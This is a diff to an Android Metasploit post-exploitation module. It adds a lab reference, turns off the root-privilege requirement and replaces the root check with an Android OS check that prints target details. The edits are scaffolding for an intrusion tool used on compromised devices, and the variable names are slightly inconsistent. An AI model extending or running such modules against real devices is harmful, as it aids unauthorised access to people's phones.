@@ -11,7 +11,7 @@
 # [ android_aux.rb ]
 # Author: pedr0 Ubuntu [r00t-3xp10it]
 # tested on:
-# P.O.C:
+# P.O.C: https://resources.infosecinstitute.com/lab-android-exploitation-with-kali/
 #
 #
 # [ POST-EXPLOITATION MODULE DESCRIPTION ]
@@ -94,7 +94,7 @@ class MetasploitModule < Msf::Post
                         'DisclosureDate' => '21 jun 2018',
                         'Platform'       => 'android',
                         'Arch'           => ARCH_DALVIK,
-                        'Privileged'     => 'true',  # root privileges required?
+                        'Privileged'     => 'false',  # root privileges required?
                         'Targets'        =>
                                 [
                                          [ 'android' ]
@@ -136,6 +136,7 @@ def run
   #
   # Variable declarations (msf API calls)
   #
+  sysnfo = session.sys.config.sysinfo
   runtor = client.sys.config.getuid
   runsession = client.session_host
   directory = client.fs.dir.pwd
@@ -149,6 +150,7 @@ def run
   print_line("")
   print_line("    Running on session  : #{datastore['SESSION']}")
   print_line("    Target IP addr      : #{runsession}")
+  print_line("    Operative System    : #{sysnfo['OS']}")
   print_line("    Payload directory   : #{directory}")
   print_line("    Client UID          : #{runtor}")
   print_line("")
@@ -165,11 +167,10 @@ def run
       return nil
     end
     #
-    # Check if we are running in an higth integrity context (root)
+    # Check for proper target operative system (Linux)
     #
-    id = cmd_exec('id')
-    unless id =~ /root/
-      print_error("[ABORT]: This module requires root permissions")
+    unless sysinfo['OS'] =~ /Android/ || sysinfo['OS'] =~ /android/
+      print_error("[ABORT]: This module only works againts Android systems")
       return nil
     end
     #
